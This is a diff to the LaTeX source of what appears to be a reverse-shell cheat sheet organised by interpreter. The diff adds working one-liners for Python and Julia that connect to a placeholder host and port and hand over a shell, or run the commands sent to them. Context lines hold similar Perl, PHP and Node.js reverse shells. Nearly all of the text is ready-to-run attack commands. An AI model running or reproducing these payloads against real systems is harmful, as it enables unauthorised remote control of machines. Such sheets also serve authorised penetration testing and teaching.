@@ -122,16 +122,21 @@ openssl s_server -quiet -key key.pem -cert cert.pem -port |\port|
 
 \section{Programming languages interpreters}
 
-\subsection{Python}
+\subsection{Python (\texttt{python/python3})}
 
-\subsection{Perl}
+\begin{cmdline}{bash}{|}{python}{}
+python -c 'import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect(("|\host|",|\port|)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call(["|\shell|"]);'
+\end{cmdline}
+\TODO{dependencies}
+
+\subsection{Perl (\texttt{perl})}
 
 \begin{cmdline}{bash}{|}{perl}{}
 perl -e 'use Socket; socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp")); if(connect(S,sockaddr_in(|\port|,inet_aton("|\host|")))){ open(STDIN,">&S"); open(STDOUT,">&S"); open(STDERR,">&S"); exec("|\shell|");};'
 \end{cmdline}
 \TODO{dependencies}
 
-\subsection{PHP}
+\subsection{PHP (\texttt{php})}
 
 \begin{cmdline}{bash}{|}{php}{}
 php -r '$sock=fsockopen("|\host|",|\port|); exec("|\shell| <&3 >&3 2>&3");'
@@ -158,6 +163,14 @@ echo 'require "socket"; exit if fork; c=TCPSocket.new("^\host^",^\port^); while(
 \begin{cmdline}{bash}{|}{node}{}
 node -e 'shell = require("child_process").spawn("|\shell|"); require("net").connect(|\port|, "|\host|", function () { this.pipe(shell.stdin); shell.stdout.pipe(this); shell.stderr.pipe(this); })'
 \end{cmdline}
+
+\subsection{Julia (\texttt{julia})}
+
+\begin{cmdline}{bash}{|}{julia}{}
+julia -e 'using Sockets; sock=connect("|\host|", parse(Int64,"|\port|")); while true; cmd = readline(sock); if !isempty(cmd); cmd = split(cmd); ioo = IOBuffer(); ioe = IOBuffer(); run(pipeline(`$cmd`, stdout=ioo, stderr=ioe)); write(sock, String(take!(ioo)) * String(take!(ioe))); end; end;'
+\end{cmdline}
+%$
+\TODO{dependencies}
 
 \section{Other tools}
 
